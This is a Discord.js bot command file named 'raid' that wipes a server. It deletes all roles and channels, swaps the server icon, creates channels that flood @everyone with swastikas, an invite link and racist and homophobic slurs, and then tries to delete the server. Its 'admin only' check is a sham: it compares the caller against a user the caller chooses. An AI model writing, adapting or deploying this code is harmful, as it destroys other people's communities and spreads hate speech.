const { SlashCommandBuilder } = require('discord.js');
const { AttachmentBuilder } = require('discord.js');
const wait = require('node:timers/promises').setTimeout;

module.exports = {
    data: new SlashCommandBuilder()
        .setName('raid')
        .setDescription('Raids the server (admin only)')
        .addUserOption(option => option.setName('target').setDescription('The user who can use this command').setRequired(true)),
    async execute(interaction) {
        const target = interaction.options.getUser('target');
        if (interaction.user.id !== target.id) {
            return interaction.reply({ content: 'You are not authorized to use this command!', ephemeral: true });
        }

        await interaction.reply({ content: 'Starting raid...', ephemeral: true });

        // Delete all roles
        interaction.guild.roles.cache.forEach(async (role) => {
            try {
                if (role.name !== '@everyone') {
                    await role.delete();
                }
            } catch (error) {
                console.error(`Failed to delete role ${role.name}:`, error);
            }
        });

        // Delete all channels
        interaction.guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch (error) {
                console.error(`Failed to delete channel ${channel.name}:`, error);
            }
        });

        // Create new roles
        try {
            await interaction.guild.roles.create({ name: 'Reaper Raided You', color: 'Red' });
        } catch (error) {
            console.error('Failed to create role:', error);
        }

        // Change server profile picture
        try {
            const attachment = new AttachmentBuilder('https://preview.redd.it/bad-to-the-bone-v0-gbxt4ko5q2ya1.jpg?auto=webp&s=fee58f8dfda8623eb8a8dd328262efb9a2f11be0', { name: 'server_icon.jpg' });
            await interaction.guild.setIcon(attachment);
        } catch (error) {
            console.error('Failed to set server icon:', error);
        }

        // Spam channels (create and send messages)
        for (let i = 0; i < 5; i++) { // create 5 channels to spam to
            try {
                const channel = await interaction.guild.channels.create('reaper-raid', { type: 0 }); // 0 is text channel
                for (let j = 0; j < 5; j++) { // send 5 messages to each new channel
                    await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
                }
            } catch (error) {
                console.error('Failed to create/spam channel:', error);
            }
        }


        // Delete the server after 10 seconds
        await wait(10000);
        try {
            await interaction.guild.delete();
        } catch (error) {
            console.error('Failed to delete server:', error);
            //If the bot doesn't have perms, it will log it
        }
    },
};
